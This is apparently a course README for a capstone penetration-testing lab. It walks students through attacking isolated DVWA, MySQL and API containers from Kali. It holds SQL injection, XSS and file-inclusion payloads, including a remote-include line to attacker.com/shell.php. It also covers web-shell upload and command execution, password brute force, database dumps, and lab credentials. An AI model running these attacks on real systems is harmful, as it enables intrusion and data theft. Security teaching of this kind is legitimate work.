# Lab 8: Final Project - Comprehensive Penetration Testing Capstone

## Overview

Lab 8 is the capstone project that brings together all the techniques and tools learned throughout the course. Students will conduct a **complete penetration testing engagement** against a comprehensive vulnerable infrastructure combining:

- **Web Application Penetration Testing** (DVWA)
- **Database Security Assessment** (MySQL)
- **REST API Security Evaluation**
- **Network Reconnaissance & Enumeration**
- **Exploitation & Post-Exploitation**
- **Report Generation**

This lab simulates a real-world penetration testing scenario where you must identify vulnerabilities across multiple attack surfaces and produce a professional penetration test report.

## Requirements

- Docker Engine 24.0+
- Docker Compose 2.0+
- 6GB RAM minimum (8GB recommended)
- 15GB free disk space
- Previous labs completed (understanding of reconnaissance, exploitation, automation)

## Architecture

```
┌───────────────────────────────────────────────────────────────┐
│        Docker Network (172.18.8.0/24) - Isolated Lab          │
├───────────────────────────────────────────────────────────────┤
│                                                               │
│  Kali Linux (172.18.8.10)                                    │
│  ├── Metasploit Framework (msfconsole, msfvenom)             │
│  ├── Reconnaissance Tools (nmap, dig, whois)                 │
│  ├── Web Testing Tools (nikto, sqlmap, hydra)                │
│  ├── Exploitation Tools (metasploit, hashcat)                │
│  ├── Post-Exploitation Tools (meterpreter, shells)           │
│  └── Reporting Tools (jq, curl, custom scripts)              │
│                                                               │
│  ┌─────────────────────────────────────────────────────────┐ │
│  │           Vulnerable Infrastructure                      │ │
│  │                                                          │ │
│  │  DVWA Web App         MySQL Database    REST API         │ │
│  │  (172.18.8.20:80)    (172.18.8.30:3306) (172.18.8.40:3000)│
│  │  - Auth Bypass        - Default Creds   - API Keys       │ │
│  │  - SQL Injection      - Weak Security   - Insecure       │ │
│  │  - XSS               - No Encryption    - JWT Bypass     │ │
│  │  - CSRF              - Exposed Creds    - Direct Object  │ │
│  │  - File Inclusion                       Reference        │ │
│  │                                                          │ │
│  └─────────────────────────────────────────────────────────┘ │
│                                                               │
└───────────────────────────────────────────────────────────────┘
```

## Network Configuration

| Service | IP Address | Port(s) | Role |
|---------|-----------|---------|------|
| Kali Linux | 172.18.8.10 | - | Attacker/Penetration Tester |
| DVWA Web | 172.18.8.20 | 80/8080 | Vulnerable Web Application |
| MySQL DB | 172.18.8.30 | 3306 | Backend Database |
| REST API | 172.18.8.40 | 3000/3001 | Vulnerable API |

## Quick Start

### 1. Start the Lab

```bash
cd /Users/statick/apps/labs/docker-labs/lab8
docker-compose up -d
```

### 2. Verify all services are running

```bash
docker-compose ps

# Expected output:
# CONTAINER ID  IMAGE                          COMMAND  CREATED  STATUS              PORTS
# ...           kalilinux/kali-rolling:latest  ...      ...      Up 2 minutes        
# ...           vulnerables/web-dvwa:latest    ...      ...      Up 2 minutes (healthy)  0.0.0.0:8080->80/tcp
# ...           mysql:5.7                      ...      ...      Up 2 minutes (healthy)  172.18.8.30:3306
# ...           vulnerables/web-api:latest     ...      ...      Up 2 minutes (healthy)  0.0.0.0:3001->3000/tcp
```

### 3. Wait for all services to be healthy

```bash
docker-compose logs -f
# Watch for "healthy" status for web and api containers
```

### 4. Connect to Kali container

```bash
docker-compose exec kali /bin/bash
```

### 5. Verify connectivity to targets

```bash
# From inside Kali container
ping -c 1 172.18.8.20  # Web server
ping -c 1 172.18.8.30  # Database
ping -c 1 172.18.8.40  # API server
```

### 6. Access targets from local machine

```bash
# DVWA Web Application
open http://localhost:8080

# REST API
open http://localhost:3001
```

## Learning Objectives

By completing Lab 8, students will be able to:

- ✓ Conduct comprehensive network reconnaissance
- ✓ Identify vulnerabilities across multiple services
- ✓ Exploit web application flaws (SQL injection, XSS, auth bypass)
- ✓ Attack database systems
- ✓ Compromise REST APIs
- ✓ Perform post-exploitation activities
- ✓ Create professional penetration test reports
- ✓ Document findings with proof-of-concept exploits
- ✓ Propose remediation strategies
- ✓ Demonstrate real-world pentesting workflow

## Penetration Testing Methodology

This lab follows a structured penetration testing approach:

1. **Reconnaissance** - Gather information about targets
2. **Scanning** - Identify open ports and services
3. **Enumeration** - Extract detailed information
4. **Vulnerability Analysis** - Identify weaknesses
5. **Exploitation** - Gain unauthorized access
6. **Post-Exploitation** - Maintain access & extract data
7. **Reporting** - Document all findings

## Exercises

### Exercise 1: Network Reconnaissance

**Objective**: Map the infrastructure and identify services

From Kali container:

```bash
# 1. Identify live hosts on the network
nmap -n -sn 172.18.8.0/24

# 2. Comprehensive port scan
nmap -p- -sV -sC -O 172.18.8.0/24 -oA /root/reports/nmap_initial

# 3. Service fingerprinting
nmap -sV -p 80,443,3000,3306 172.18.8.0/24

# 4. Detect OS versions
nmap -O 172.18.8.0/24

# 5. UDP scanning for additional services
nmap -sU -p- 172.18.8.0/24
```

Expected findings:
- HTTP (80): DVWA Web Application
- MYSQL (3306): Database service
- HTTP (3000): REST API

### Exercise 2: DVWA Web Application Penetration Testing

**Objective**: Identify and exploit web application vulnerabilities

#### 2.1 Reconnaissance of Web Application

```bash
# 1. Banner grabbing
curl -I http://172.18.8.20

# 2. Directory enumeration
nmap -p 80 --script=http-enum 172.18.8.20

# 3. Web vulnerability scanning with Nikto
nikto -h 172.18.8.20 -o /root/reports/nikto_report.txt

# 4. Screenshot application structure
curl -s http://172.18.8.20 | head -100
```

#### 2.2 SQL Injection Testing

```bash
# 1. Identify SQL injection points
sqlmap -u "http://172.18.8.20/vulnerabilities/sqli/" \
  --cookie="security=low" \
  --data="id=1&Submit=Submit" \
  --dbs

# 2. Extract database information
sqlmap -u "http://172.18.8.20/vulnerabilities/sqli/" \
  --cookie="security=low" \
  --data="id=1&Submit=Submit" \
  --dump

# 3. Manual SQL injection testing
# Try: 1' OR '1'='1
```

#### 2.3 Authentication Bypass

```bash
# 1. Test default credentials
curl -s http://172.18.8.20/login.php \
  -d "username=admin&password=admin&Login=Login"

# 2. Test for authentication bypass
# Common payloads:
# - admin' or '1'='1' --
# - admin' --
# - ' or 1=1 --

# 3. Session manipulation
# Inspect cookies in browser
# Try modifying role/admin parameters
```

#### 2.4 Cross-Site Scripting (XSS)

```bash
# 1. Reflected XSS testing
# Test parameter with: <script>alert('XSS')</script>

# 2. Stored XSS testing
# Submit comments with: <img src=x onerror=alert('XSS')>

# 3. Automated XSS scanning
nikto -h 172.18.8.20 --Plugins xss
```

#### 2.5 File Inclusion Vulnerabilities

```bash
# 1. Local File Inclusion (LFI)
# Test: ?file=../../../../etc/passwd

# 2. Remote File Inclusion (RFI)
# Test: ?file=http://attacker.com/shell.php

# 3. Path traversal
# Test various payloads using curl
curl "http://172.18.8.20/vulnerabilities/fi/?page=../../../../etc/passwd"
```

### Exercise 3: Database Security Assessment

**Objective**: Assess MySQL database security and extract sensitive data

```bash
# 1. Identify database service
nmap -p 3306 -sV 172.18.8.30

# 2. Attempt direct connection (from inside network)
mysql -h 172.18.8.30 -u dvwa -p'p@ssw0rd' -e "SELECT VERSION();"

# 3. Extract databases
mysql -h 172.18.8.30 -u dvwa -p'p@ssw0rd' -e "SHOW DATABASES;"

# 4. Extract tables from dvwa database
mysql -h 172.18.8.30 -u dvwa -p'p@ssw0rd' dvwa -e "SHOW TABLES;"

# 5. Dump sensitive data
mysql -h 172.18.8.30 -u dvwa -p'p@ssw0rd' dvwa \
  -e "SELECT * FROM users;" > /root/reports/db_users.txt

# 6. Check for weak configurations
mysql -h 172.18.8.30 -u dvwa -p'p@ssw0rd' \
  -e "SHOW VARIABLES LIKE 'require_secure_transport';"

mysql -h 172.18.8.30 -u dvwa -p'p@ssw0rd' \
  -e "SHOW VARIABLES LIKE 'sql_mode';"
```

### Exercise 4: REST API Security Assessment

**Objective**: Test API for authentication, authorization, and injection flaws

```bash
# 1. API Reconnaissance
curl -v http://172.18.8.40/api/health

# 2. List API endpoints
curl -s http://172.18.8.40/api/endpoints | jq .

# 3. Test without authentication
curl -s http://172.18.8.40/api/users | jq .

# 4. Test with default API key
curl -s http://172.18.8.40/api/users \
  -H "Authorization: Bearer sk-default-insecure-key" | jq .

# 5. Test for SQL injection in API
curl -s "http://172.18.8.40/api/users?id=1' OR '1'='1"

# 6. Test for API key exposure
curl -s http://172.18.8.40/api/config

# 7. Check for CORS misconfiguration
curl -i -X OPTIONS http://172.18.8.40/api/users

# 8. Test parameter pollution
curl -s "http://172.18.8.40/api/users?id=1&id=2&id=3"
```

### Exercise 5: Exploitation with Metasploit

**Objective**: Use Metasploit Framework for automated exploitation

```bash
# Start Metasploit
msfconsole

# In msfconsole console:

# 1. Create workspace for organization
workspace -a lab8_pentest
db_status

# 2. Import Nmap results
db_import /root/reports/nmap_initial.xml

# 3. Search for DVWA exploits
search dvwa

# 4. Auxiliary scanner for web vulnerabilities
use auxiliary/scanner/http/http_version
set RHOSTS 172.18.8.20
run

# 5. Use vulnerability scanner
search http_scanner
use auxiliary/scanner/http/ms15_034_http_sys_memory_dump
set RHOSTS 172.18.8.20
run

# 6. Exploit database service
search mysql
use auxiliary/scanner/mysql/mysql_version
set RHOSTS 172.18.8.30
run

# 7. Brute force database
use auxiliary/scanner/mysql/mysql_login
set RHOSTS 172.18.8.30
set USERNAME dvwa
set PASS_FILE /usr/share/wordlists/rockyou.txt
run

# 8. Exit msfconsole
exit
```

### Exercise 6: Post-Exploitation

**Objective**: Simulate data exfiltration and persistence

```bash
# 1. Extract DVWA database via SQL injection
sqlmap -u "http://172.18.8.20/vulnerabilities/sqli/" \
  --cookie="security=low" \
  --data="id=1&Submit=Submit" \
  --dump-all \
  -o /root/reports/dvwa_dump

# 2. Create backdoor access
# From DVWA shell upload: simple PHP shell
curl -F "uploaded_file=@shell.php" \
  http://172.18.8.20/vulnerabilities/upload/

# 3. Execute commands through backdoor
curl "http://172.18.8.20/uploads/shell.php?cmd=id"

# 4. Extract API configuration
curl -s http://172.18.8.40/api/config \
  -H "Authorization: Bearer sk-default-insecure-key" | jq . > /root/reports/api_config.json

# 5. Enumerate other users in database
mysql -h 172.18.8.30 -u dvwa -p'p@ssw0rd' dvwa \
  -e "SELECT * FROM users;" > /root/reports/all_users.txt

# 6. Extract sensitive application data
mysql -h 172.18.8.30 -u dvwa -p'p@ssw0rd' dvwa \
  -e "SELECT * FROM guestbook;" > /root/reports/guestbook.txt
```

### Exercise 7: Create Penetration Test Report

**Objective**: Compile findings into professional documentation

Create file `/root/reports/PENTEST_REPORT.md`:

```markdown
# Penetration Testing Report
## Lab 8 Final Project Assessment

### Executive Summary
- **Assessment Date**: [Date]
- **Duration**: [Time spent]
- **Organization**: Target Infrastructure
- **Scope**: Complete network and web application assessment
- **Overall Risk Level**: CRITICAL

### Assessment Methodology
- Reconnaissance and information gathering
- Network scanning and enumeration
- Vulnerability identification and assessment
- Exploitation and privilege escalation
- Post-exploitation and data extraction
- Professional report generation

### Findings Summary

#### CRITICAL Severity (5)
1. **SQL Injection in Web Application**
   - Location: /vulnerabilities/sqli/
   - Impact: Complete database compromise
   - Proof: [Screenshot]
   - Remediation: Input validation and parameterized queries

2. **Default Database Credentials**
   - Location: MySQL 172.18.8.30:3306
   - Credentials: dvwa:p@ssw0rd
   - Impact: Unauthorized database access
   - Remediation: Strong credentials and network segmentation

3. **Authentication Bypass**
   - Location: /login.php
   - Method: SQL injection bypass
   - Impact: Unauthorized application access
   - Remediation: Secure authentication implementation

4. **Insecure API Authentication**
   - Location: /api/
   - Issue: Default API keys in code
   - Impact: API compromise
   - Remediation: OAuth 2.0 implementation

5. **Exposed Database Credentials**
   - Location: Database configuration
   - Impact: Complete infrastructure compromise
   - Remediation: Secrets management system

#### HIGH Severity (3)
1. **Missing Security Headers**
   - Impact: XSS, Clickjacking vulnerabilities
   - Remediation: Add CSP, X-Frame-Options headers

2. **Unencrypted Data Transmission**
   - Impact: Man-in-the-middle attacks
   - Remediation: HTTPS enforcement

3. **Directory Enumeration**
   - Impact: Information disclosure
   - Remediation: Disable directory listing

#### MEDIUM Severity (2)
1. **Weak Password Policy**
2. **Missing Rate Limiting**

### Proof of Concepts
[Include actual exploitation steps with screenshots]

### Timeline
- [Date/Time] - Reconnaissance completed
- [Date/Time] - Vulnerabilities identified
- [Date/Time] - Exploitation executed
- [Date/Time] - Post-exploitation activities
- [Date/Time] - Report generation

### Risk Assessment
- Network is CRITICALLY vulnerable
- Immediate remediation required
- System should not be in production

### Recommendations
1. Patch all identified vulnerabilities immediately
2. Implement security headers
3. Enable HTTPS
4. Implement WAF
5. Regular security assessments

### Conclusion
The assessed infrastructure contains multiple critical vulnerabilities that would allow 
complete compromise. Immediate action is required to remediate these issues.

---
**Report Generated**: [Date]
**Assessor**: [Your Name]
```

### Exercise 8: Automated Penetration Test Script

**Objective**: Create automated workflow combining multiple tools

Create file `/root/scripts/full_pentest.sh`:

```bash
#!/bin/bash

# Comprehensive Penetration Test Script
# Usage: ./full_pentest.sh <target_network>

TARGET_NET="${1:-172.18.8.0/24}"
REPORT_DIR="/root/reports"
TIMESTAMP=$(date +%Y%m%d_%H%M%S)

echo "[*] Lab 8 Comprehensive Penetration Test"
echo "[*] Target Network: $TARGET_NET"
echo "[*] Report Directory: $REPORT_DIR"

# Phase 1: Reconnaissance
echo ""
echo "[*] Phase 1: Reconnaissance"
nmap -n -sn $TARGET_NET -oA $REPORT_DIR/ping_sweep_$TIMESTAMP

# Phase 2: Detailed Scanning
echo "[*] Phase 2: Service Enumeration"
nmap -p- -sV -sC -O $TARGET_NET \
  -oA $REPORT_DIR/comprehensive_scan_$TIMESTAMP \
  -oX $REPORT_DIR/comprehensive_scan_$TIMESTAMP.xml

# Phase 3: Web Application Testing
echo "[*] Phase 3: Web Application Assessment"
nikto -h 172.18.8.20 -output $REPORT_DIR/nikto_$TIMESTAMP.txt

# Phase 4: Database Testing
echo "[*] Phase 4: Database Assessment"
nmap -p 3306 -sV -sC 172.18.8.30 \
  -oA $REPORT_DIR/mysql_scan_$TIMESTAMP

# Phase 5: API Testing
echo "[*] Phase 5: REST API Assessment"
curl -s http://172.18.8.40/api/endpoints > $REPORT_DIR/api_endpoints_$TIMESTAMP.json

# Phase 6: Generate Report
echo "[*] Phase 6: Generating Report"
cat > $REPORT_DIR/AUTOMATED_REPORT_$TIMESTAMP.txt << EOF
AUTOMATED PENETRATION TEST REPORT
==================================
Date: $(date)
Target Network: $TARGET_NET

FINDINGS SUMMARY:
- Scan Results: See comprehensive_scan_$TIMESTAMP.*
- Nikto Report: See nikto_$TIMESTAMP.txt
- Database Info: See mysql_scan_$TIMESTAMP.*

NEXT STEPS:
1. Manual verification of findings
2. Exploitation of discovered vulnerabilities
3. Create remediation plan
EOF

echo "[+] Penetration test complete!"
echo "[+] Results saved to: $REPORT_DIR"
echo "[+] Key files:"
ls -lah $REPORT_DIR/*$TIMESTAMP*
```

Run the automated script:

```bash
chmod +x /root/scripts/full_pentest.sh
/root/scripts/full_pentest.sh 172.18.8.0/24
```

## Default Credentials Reference

### DVWA Web Application

```
URL: http://localhost:8080/
Username: admin
Password: admin
```

### MySQL Database

```
Host: 172.18.8.30
Username: dvwa
Password: p@ssw0rd
Root Password: r00tp@ss
Database: dvwa
```

### REST API

```
Base URL: http://localhost:3001
Default API Key: sk-default-insecure-key
```

## Known Vulnerabilities in Lab Infrastructure

### DVWA (Web Application)

1. **SQL Injection** - SQL Injection vulnerabilities in input fields
2. **Authentication Bypass** - Weak authentication mechanisms
3. **Cross-Site Scripting (XSS)** - Reflected and stored XSS
4. **Insecure File Upload** - File upload without validation
5. **Cross-Site Request Forgery (CSRF)** - Missing CSRF tokens
6. **Broken Access Control** - Inadequate authorization checks
7. **Security Misconfiguration** - Weak security headers
8. **Sensitive Data Exposure** - Unencrypted data transmission
9. **Weak Password Storage** - Plain text or weak hashing
10. **Insecure Deserialization** - Unsafe serialization

### MySQL Database

1. **Default Credentials** - Unchanged default passwords
2. **No Encryption** - Unencrypted data at rest
3. **No SSL/TLS** - Unencrypted data in transit
4. **Weak Access Control** - Overly permissive privileges
5. **No Audit Logging** - Insufficient logging

### REST API

1. **Weak API Authentication** - Default/hardcoded keys
2. **Authorization Bypass** - Insufficient access control
3. **API Injection** - SQL injection in API endpoints
4. **CORS Misconfiguration** - Insecure CORS settings
5. **Information Disclosure** - Exposed API documentation
6. **Rate Limiting Bypass** - No rate limiting

## Troubleshooting

### Containers not starting

```bash
# Check logs
docker-compose logs

# Check specific service
docker-compose logs web
docker-compose logs db
docker-compose logs api
```

### Database connection errors

```bash
# Verify database is running and healthy
docker-compose ps

# Wait for healthcheck to pass
docker-compose logs db | grep -i health

# Test connection
docker-compose exec kali mysql -h 172.18.8.30 -u dvwa -p'p@ssw0rd' -e "SELECT 1;"
```

### Web application not accessible

```bash
# Check if port 8080 is already in use
lsof -i :8080

# Verify service is running
docker-compose exec web curl -s http://localhost | head -20

# Check logs
docker-compose logs web
```

### Connectivity issues

```bash
# From Kali container, test connectivity
docker-compose exec kali ping -c 3 172.18.8.20
docker-compose exec kali ping -c 3 172.18.8.30
docker-compose exec kali ping -c 3 172.18.8.40

# Test specific ports
docker-compose exec kali nmap -p 80 172.18.8.20
docker-compose exec kali nmap -p 3306 172.18.8.30
docker-compose exec kali nmap -p 3000 172.18.8.40
```

### Low memory issues

```bash
# Reduce memory limits in docker-compose.yml
# Or increase Docker's memory allocation

# Monitor memory usage
docker stats

# Clean up unused containers/volumes
docker system prune -a --volumes
```

## Security Considerations

### Lab Environment Only

This lab contains intentionally vulnerable services. **DO NOT** use these configurations in production.

### Data Security

- All credentials in this lab are for educational purposes only
- Do not reuse these patterns in real applications
- Always use strong, unique credentials in production

### Network Isolation

- The lab uses an isolated Docker network
- No access from host machine to internal network
- Only specified ports are mapped to host

## Performance Optimization

### Faster Scanning

```bash
# Reduced timeout for quicker scans
nmap -T4 -p- 172.18.8.0/24

# Parallel scanning
nmap -p- -sV --host-timeout 5m 172.18.8.0/24
```

### Reduced Memory Usage

```bash
# Monitor containers
docker stats

# Limit nmap verbosity
nmap -p- 172.18.8.0/24 -v0
```

## Cleanup

### Stop all services

```bash
docker-compose stop
```

### Remove all containers

```bash
docker-compose down
```

### Complete cleanup (including volumes)

```bash
docker-compose down -v
```

### Remove reports

```bash
rm -rf /root/reports/*
```

## Success Criteria

You have successfully completed Lab 8 when you can:

- ✓ Map complete network architecture
- ✓ Identify all services and open ports
- ✓ Execute SQL injection exploits
- ✓ Bypass authentication mechanisms
- ✓ Access database directly
- ✓ Compromise REST API
- ✓ Perform post-exploitation activities
- ✓ Extract sensitive data from all services
- ✓ Create professional penetration test report
- ✓ Document findings with proof-of-concepts
- ✓ Propose detailed remediation strategies

## Learning Outcomes

### Technical Skills

- Advanced network reconnaissance
- Web application penetration testing
- Database security assessment
- API security evaluation
- Metasploit Framework expertise
- Exploit development and execution
- Post-exploitation techniques
- Data exfiltration methods

### Professional Skills

- Vulnerability assessment
- Risk prioritization
- Report writing
- Stakeholder communication
- Remediation recommendation
- Professional documentation

## Resources

### Penetration Testing References

- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [Metasploit Unleashed](https://www.offensive-security.com/metasploit-unleashed/)
- [NIST Cybersecurity Framework](https://www.nist.gov/cyberframework)
- [PTES - Penetration Testing Execution Standard](http://www.pentest-standard.org/)

### Tools Documentation

- [Nmap Manual](https://nmap.org/book/)
- [Metasploit Documentation](https://docs.metasploit.com/)
- [SQLMap Documentation](http://sqlmap.org/)
- [Nikto Scanner](https://cirt.net/Nikto2)

### DVWA

- [DVWA GitHub](https://github.com/digininja/DVWA)
- [DVWA Tutorial](https://www.dvwa.co.uk/)

## Support & Feedback

If you encounter issues:

1. Check the Troubleshooting section above
2. Review Docker logs for error messages
3. Verify all services are healthy: `docker-compose ps`
4. Consult tool documentation
5. Review previous labs for reference material

## Next Steps After Lab 8

After completing this capstone:

1. **Advanced Topics**
   - Wireless penetration testing
   - Mobile application security
   - Cloud infrastructure assessment
   - Advanced exploitation techniques

2. **Professional Development**
   - Pursue OSCP certification
   - Join bug bounty programs
   - Contribute to open-source security tools
   - Participate in CTF competitions

3. **Career Path**
   - Red team operator
   - Penetration tester
   - Security researcher
   - Incident responder

---

**Lab Created**: March 2026  
**Last Updated**: March 2026  
**Status**: Ready for Student Use  
**Difficulty Level**: Advanced (Capstone)  
**Estimated Duration**: 12-16 hours  

**Congratulations on reaching the final lab! This capstone represents a comprehensive penetration testing engagement. Complete all exercises, document your findings, and generate a professional report. You're now ready for advanced security roles!**
